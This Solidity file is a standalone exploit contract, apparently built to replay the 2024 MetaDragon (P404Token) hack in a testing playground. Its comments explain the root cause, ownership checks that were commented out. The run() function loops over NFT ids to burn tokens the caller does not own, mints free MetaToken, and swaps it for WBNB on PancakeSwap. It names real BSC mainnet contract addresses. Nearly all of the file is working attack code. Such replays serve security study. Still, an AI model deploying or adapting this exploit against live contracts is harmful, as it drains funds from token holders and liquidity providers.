// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-05-MetaDragon).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (MetaDragonTest is Test; testExploit() calls meta_token.call(...) and the
// PancakeRouter directly with attacker == address(this), so there is no
// standalone exploit contract to deploy). This contract is a faithful,
// self-contained copy of that inline attack (the tokenId loop + router dump)
// so the playground can deploy it and record run(). Logic and constants are
// copied verbatim from test/MetaDragon_exp.sol.
//
// Root cause: P404Token._erc721ToErc20() (token.sol:266-275) has its
// `require(ownerOf(_tokenId) == msg.sender)` ownership check commented out,
// and the downstream P404NFT.burn() (nft.sol:76-85) has its owner/approved
// check commented out too (it only checks the caller is the token contract,
// which is always true). So `transfer(metaToken, tokenId)` — routed by
// P404Token._update() into transform()/_erc721ToErc20() whenever `to ==
// address(this)` and `value` looks like a valid NFT id (< 30001) — burns
// *anyone's* NFT and mints 9,800 fresh MetaToken to the caller, with no
// ownership check anywhere in the path. Looping over the live NFT id space
// mints MetaToken from nothing; dumping it into the MetaToken/WBNB pool
// converts the free mint into real WBNB.

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract MetaDragonDrain {
    // Vulnerable P404Token ("MetaToken" / MetaDragon), BSC mainnet.
    address constant META_TOKEN = 0xEF1f39d8391cdDcaee62b8b383cB992F46a6ce4f;
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    // The historical PoC enumerates tokenId 0..39 (endTokenId = 40); ids with
    // no live owner simply revert (ERC721NonexistentToken) and are skipped —
    // the raw call's return value is intentionally ignored, exactly like the
    // Foundry test.
    uint256 constant END_TOKEN_ID = 40;

    function run() external {
        // Step 1: loop transfer(metaToken, tokenId) for every candidate id.
        // P404Token._update() treats `to == address(this)` + a "valid token
        // id" `value` as an NFT redemption: it calls transform(value) ->
        // _erc721ToErc20(value), which burns NFT #value (owner check
        // commented out) and mints 9,800 MetaToken to msg.sender (this
        // contract) — regardless of who actually owns that NFT.
        for (uint256 i = 0; i < END_TOKEN_ID; i++) {
            bytes memory calldatas = abi.encodeWithSignature("transfer(address,uint256)", META_TOKEN, i);
            // don't check return value — ids with no current owner revert
            // and are simply skipped, matching the historical PoC.
            META_TOKEN.call(calldatas);
        }

        // Step 2: dump every free-minted MetaToken into the MetaToken/WBNB
        // PancakeSwap pool for real WBNB.
        uint256 metaBalance = IERC20(META_TOKEN).balanceOf(address(this));
        IERC20(META_TOKEN).approve(ROUTER, type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = META_TOKEN;
        path[1] = WBNB;

        IUniswapV2Router(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            metaBalance, 0, path, address(this), block.timestamp
        );
    }
}
